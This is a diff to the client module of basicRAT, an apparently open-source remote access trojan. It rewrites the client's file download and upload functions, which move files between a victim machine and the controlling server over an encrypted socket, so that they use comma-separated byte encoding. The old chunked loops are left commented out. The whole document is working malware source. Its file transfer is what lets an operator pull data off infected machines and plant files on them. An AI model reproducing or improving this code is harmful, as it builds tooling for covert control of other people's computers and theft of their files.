@@ -5,9 +5,11 @@
 # https://github.com/vesche/basicRAT
 #
 
+import base64
 import crypto
 import os
 import socket
+import time
 
 
 class Client(object):
@@ -55,19 +57,38 @@ class Client(object):
     def recvfile(self, fname):
         if os.path.isfile(fname):
             return
+
+        data = self.recvGCM()
+        data = data.split(',')
+        data = filter(lambda a: a != '', data)
+        data = ''.join(map(chr, map(int, data)))
+
         with open(fname, 'wb') as f:
-            data = self.recvGCM()
-            while data:
-                f.write(data)
-                data = self.recvGCM()
+            f.write(data)
+
+        #with open(fname, 'wb') as f:
+        #    data = self.recvGCM()
+        #    while data:
+        #        data = data.split(',')
+        #        data = filter(lambda a: a != '', data)
+        #        data = ''.join(map(chr, map(int, data)))
+        #        f.write(data)
+        #        data = self.recvGCM()
 
     # send a file over a socket (upload)
     def sendfile(self, fname):
         if not os.path.isfile(fname):
             return
+
         with open(fname, 'rb') as f:
-            res = f.read(4096)
-            while len(res):
-                self.sendGCM(res)
-                res = f.read(4096)
-            sock.send('\x00\x00\x00\x00') # EOF
+            data = f.read()
+
+        data = ','.join(map(str, map(ord, data)))
+        self.sendGCM(data)
+
+        #with open(fname, 'rb') as f:
+        #    data = f.read(4096)
+        #    while data:
+        #        data = ','.join(map(str, map(ord, data)))
+        #        self.sendGCM(data)
+        #        data = f.read(4096)
